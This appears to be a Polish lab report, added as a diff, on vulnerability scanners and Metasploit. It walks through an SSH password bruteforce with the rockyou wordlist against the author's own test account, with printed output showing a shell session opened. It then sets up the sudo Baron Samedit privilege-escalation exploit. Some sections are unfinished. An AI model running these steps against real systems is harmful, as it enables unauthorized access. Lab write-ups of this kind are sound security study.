@@ -1,0 +1,107 @@
+#+TITLE: Sprawozdanie - Analiza podatności opragromwania
+#+LANGUAGE: pl
+#+LATEX_HEADER: \usepackage[AUTO]{babel}
+#+LATEX_HEADER: \usepackage[margin=1in]{geometry}
+
+* Skaner podatności oprogramowania
+Skanery podatności oprogramowania to zautomatyzowanie narzędzia które skanują programy (aplikacjie sieciowe itp.) by wyszukać najczęsciej spotykane wektory ataku. Nazywane sa dynamicznymi gdyż głownie operują na podstawie  wykonania ataku na działająca usługe lub system. Do tego typu często używanych ataków należa m.in:
++ SQL injection
++ XSS (cross site scripting)
++ XSRF (cross site request forgery)
++ Command Injection
+** Licencjowanie
+  Zwykle jest to oprogramowanie wspomagane poprzez społeczeństwo używające licencji otwartego oprogramowania (apache, MIT) lub /copyleftowych/ licencji wolnego oprogramowania (GPL,BSD 3 clause) albo sa wspierane jako produkt przez firme oferujące usługi zawarte w takim skanerze. Część tych produktów ma również darmową wersję (czasami rozwijane jako /community/ używając powyższych licencji).
+** Funkcjonalność
+Skanery te można podzielić na takie które
+* Metasploit Framework
+Metasploit jest jednym z bardziej zaawansowanych (i rozległych) narzędzi do pentestowania.
+
+
+
+Niestety z braku projektów
+
+** Instalacja
+Moja dystrybucja systemu GNU/linux (ArchLinux) oferuje paczkę Metasploit w repozytorium. Metasploit wymaga tylko konfiguracji rvm (ruby) oraz załozenia bazy danych postgres.
+** Bruteforce ssh
+W tym przypadku spreparowalem konto na systemie który bedzie celem penetracji.
+#+begin_src 
+
+  #useradd msfexploit
+  #passwd   #hasło zostało ustawione na password1
+
+#+end_src
+
+Na maszyne z metasploit pobrałem również popularny plik słownikowy rockyou.txt zawierający najczęsciej pojawiające się hasła.
+
+#+begin_export latex
+{\scriptsize
+#+end_export
+#+begin_src bash
+
+msf6 auxiliary(scanner/ssh/ssh_login) > show options
+
+Module options (auxiliary/scanner/ssh/ssh_login):
+
+   Name              Current Setting          Required  Description
+   ----              ---------------          --------  -----------
+   BLANK_PASSWORDS   false                    no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                        yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                    no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                    no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                    no        Add all users in the current database to the list
+   DB_SKIP_EXISTING  none                     no        Skip existing credentials stored in the current database (Acc
+                                                        epted: none, user, user&realm)
+   PASSWORD                                   no        A specific password to authenticate with
+   PASS_FILE         ~/Downloads/rockyou.txt  no        File containing passwords, one per line
+   RHOSTS            servbuntu.lan            yes       The target host(s), see https://github.com/rapid7/metasploit-
+                                                        framework/wiki/Using-Metasploit
+   RPORT             22                       yes       The target port
+   STOP_ON_SUCCESS   true                     yes       Stop guessing when a credential works for a host
+   THREADS           1                        yes       The number of concurrent threads (max one per host)
+   USERNAME          msfexploit               no        A specific username to authenticate as
+   USERPASS_FILE                              no        File containing users and passwords separated by space, one p
+                                                        air per line
+   USER_AS_PASS      false                    no        Try the username as the password for all users
+   USER_FILE                                  no        File containing usernames, one per line
+   VERBOSE           false                    yes       Whether to print output for all attempts
+
+msf6 auxiliary(scanner/ssh/ssh_login) >
+#+end_src
+#+begin_export latex
+}
+#+end_export
+
+Po paru minutach metasploit znalazł hasło i stworzył "sesje" którą mozna podać innym modułom które mogą posłużyć naprzyklad do podniesienia uprawnien.
+
+#+begin_src bash
+
+msf6 auxiliary(scanner/ssh/ssh_login) > exploit
+
+[*] fdd3:f3e5:50a8::23d:22 - Starting bruteforce
+[+] fdd3:f3e5:50a8::23d:22 - Success: 'msfexploit:password1' 'uid=1004(msfexploit) gid=1004(msfexploit) grupy=1004(msfexploit) Linux servbuntu 5.11.0-40-generic #44~20.04.2-Ubuntu SMP Tue Oct 26 18:07:44 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux '
+[*] Command shell session 4 opened ([fdd3:f3e5:50a8::dd4]:35571 -> [fdd3:f3e5:50a8::23d]:22) at 2021-12-09 05:45:26 +0100
+[*] Scanned 1 of 2 hosts (50% complete)
+[*] 192.168.1.200:22 - Starting bruteforce
+[*] Scanned 1 of 2 hosts (50% complete)
+[*] Scanned 1 of 2 hosts (50% complete)
+[*] Scanned 1 of 2 hosts (50% complete)
+[*] Scanned 1 of 2 hosts (50% complete)
+[*] Scanned 2 of 2 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/ssh/ssh_login) >
+
+#+end_src
+
+** Sudoedit
+
+Następnie używając poprzednio utworzonej sesji metasploit wykona atak na stara wersje sudo na niezaktualizowanym systemie ubuntu 20.04
+
+#+begin_src bash
+
+  msf6 exploit(linux/local/sudo_baron_samedit) > use payload/linux/x64/exec
+  msf6 payload(linux/x64/exec) > set cMD "touch /home/msfexploit/here.txt"
+  cMD => touch /home/msfexploit/here.txt
+  msf6 payload(linux/x64/exec) > use payload/linux/x64/exec
+  msf6 payload(linux/x64/exec) > use exploit/linux/local/sudo_baron_samedit
+
+#+end_src
